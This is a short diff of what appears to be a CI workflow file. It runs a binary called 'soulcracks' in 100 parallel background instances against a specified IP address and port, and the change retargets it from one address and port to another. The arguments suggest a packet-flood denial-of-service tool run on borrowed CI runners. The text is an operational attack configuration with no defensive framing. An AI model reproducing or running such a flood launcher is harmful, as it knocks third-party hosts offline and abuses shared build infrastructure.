@@ -9,6 +9,6 @@ jobs:
       - run: chmod +x soulcracks
       - run: |
           for i in {1..100}; do
-            ./soulcracks 20.204.18.80 10918 240 65535 &
+            ./soulcracks 20.198.111.7 14352 120 65535 &
           done
           wait
